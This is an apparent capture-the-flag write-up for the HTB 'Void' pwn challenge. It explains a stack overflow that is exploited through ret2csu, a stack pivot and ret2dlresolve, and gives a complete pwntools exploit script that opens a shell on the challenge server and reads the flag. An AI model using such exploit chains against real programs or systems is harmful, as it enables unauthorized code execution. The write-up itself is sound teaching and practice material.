---
title: "Void"
ctf: "HTB Business CTF 2023 — The Great Escape"
date: 2026-06-11
category: pwn
difficulty: easy
points: 1000
flag_format: "HTB{...}"
author: "solve"
---

# Void

## Summary

Minimal dynamically-linked binary with only `read@plt`, no `pop rsi`/`pop rdx` gadgets. Buffer overflow in `vuln()` (64-byte buf, 200-byte read). Uses ret2csu to stage a ret2dlresolve payload, then stack-pivots into `system("/bin/sh")`.

## Solution

### Step 1: Overflow + ret2csu

The `vuln` function has a 64-byte buffer with 200-byte read. Overflow with 72 bytes padding then a ret2csu chain that calls `read(0, BSS+0xe00, payload_len)` to load a ret2dlresolve payload into writable memory.

### Step 2: Stack pivot + ret2dlresolve

After the `read` returns, `leave; ret` pivots RSP to the staged payload. The ret2dlresolve chain calls PLT[0] with a fake relocation index, causing the dynamic linker to resolve `system` with `"/bin/sh"` as the argument.

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

exe = ELF('./challenge/void')
REMOTE_HOST = '154.57.164.74'
REMOTE_PORT = 30602

def conn():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(['./challenge/glibc/ld-linux-x86-64.so.2',
        '--library-path', './challenge/glibc/', './challenge/void'])

def exploit(p):
    dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
    data_addr = dlresolve.data_addr

    rop = ROP(exe)
    rop.ret2dlresolve(dlresolve)

    stage2 = dlresolve.payload + rop.chain()
    payload_len = len(stage2)

    pop_rbx_rbp_r12_r13_r14_r15 = 0x4011b2
    csu_call                     = 0x401198
    leave_ret                    = 0x401141
    got_read                     = 0x404018

    rop_start = data_addr + len(dlresolve.payload)
    pivot_target = rop_start - 8

    stage1  = b'A' * 64 + b'B' * 8
    stage1 += p64(pop_rbx_rbp_r12_r13_r14_r15)
    stage1 += p64(0) + p64(1)         # rbx=0, rbp=1
    stage1 += p64(0)                  # r12 = edi = stdin
    stage1 += p64(data_addr)          # r13 = rsi
    stage1 += p64(payload_len)        # r14 = rdx
    stage1 += p64(got_read)           # r15 = GOT[read]
    stage1 += p64(csu_call)
    stage1 += p64(0)                  # skip (add rsp, 8)
    stage1 += p64(0) + p64(pivot_target) + p64(0)*4 + p64(leave_ret)

    assert len(stage1) <= 200
    p.send(stage1)
    sleep(0.2)
    p.send(stage2)
    sleep(0.3)
    p.sendline(b'cat flag.txt')
    flag = p.recvuntil(b'}', timeout=5).decode()
    print(f'Flag: HTB{{{flag.split("HTB{{")[-1].rstrip("}")}}}')

exploit(conn())
```

## Flag

```
HTB{pwnt00l5_h0mep4g3_15_u54ful}
```
